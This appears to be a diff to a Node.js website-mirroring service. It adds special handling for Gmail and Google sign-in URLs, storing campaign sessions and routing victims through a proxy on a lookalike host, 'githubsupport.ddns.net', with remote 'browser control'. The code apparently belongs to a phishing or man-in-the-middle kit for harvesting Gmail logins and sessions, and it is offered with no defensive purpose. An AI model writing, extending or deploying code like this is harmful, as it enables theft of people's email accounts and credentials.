@@ -8,10 +8,7 @@ const { CookieJar } = tough;
 const { wrapper } = require('axios-cookiejar-support');
 const querystring = require('querystring');
 
-// Create an axios instance with cookie jar support (no custom HTTPS agent)
 const axiosInstance = wrapper(axios.create({
-  // Remove custom HTTPS agent as it conflicts with axios-cookiejar-support
-  // SSL/TLS issues will be handled per-request if needed
 }));
 
 class WebsiteMirroringService {
@@ -2170,6 +2167,37 @@ class WebsiteMirroringService {
       // Normalize target URL
       const normalizedUrl = this.normalizeUrl(targetUrl);
       
+      // Special handling for Gmail URLs - redirect to browser service
+      if (this.isGmailUrl(normalizedUrl)) {
+        console.log(`🎯 Gmail URL detected: ${normalizedUrl} - Using browser service instead of proxy`);
+        
+        // Create session in database with special type
+        const sessionId = await new Promise((resolve, reject) => {
+          db.run(
+            `INSERT INTO WebsiteMirroringSessions 
+             (campaign_id, target_url, session_token, status, proxy_port, session_type) 
+             VALUES (?, ?, ?, ?, ?, ?)`,
+            [campaignId, normalizedUrl, sessionToken, 'active', 0, 'gmail_browser'],
+            function(err) {
+              if (err) reject(err);
+              else resolve(this.lastID);
+            }
+          );
+        });
+
+        // Return special Gmail session info
+        return {
+          sessionId,
+          sessionToken,
+          targetUrl: normalizedUrl,
+          sessionType: 'gmail_browser',
+          proxyUrl: `https://githubsupport.ddns.net/gmail-browser/${sessionToken}`,
+          message: 'Gmail session will use browser service - check the campaign dashboard for browser control',
+          requiresBrowserService: true,
+          browserControlUrl: `/api/gmail-browser/session/${sessionToken}`,
+        };
+      }
+      
       // Create session in database
       const sessionId = await new Promise((resolve, reject) => {
         db.run(
@@ -2387,6 +2415,29 @@ class WebsiteMirroringService {
       url = 'https://' + url;
     }
     return url.endsWith('/') ? url.slice(0, -1) : url;
+  }
+
+  /**
+   * Check if URL is a Gmail URL that should use browser service
+   */
+  isGmailUrl(url) {
+    try {
+      const urlObj = new URL(url);
+      const hostname = urlObj.hostname.toLowerCase();
+      
+      // Check for various Gmail-related domains
+      return hostname === 'gmail.com' ||
+             hostname === 'www.gmail.com' ||
+             hostname === 'mail.google.com' ||
+             hostname === 'accounts.google.com' ||
+             (hostname.includes('google.com') && (
+               url.includes('gmail') || 
+               url.includes('mail') ||
+               url.includes('service=mail')
+             ));
+    } catch (error) {
+      return false;
+    }
   }
 
   /**
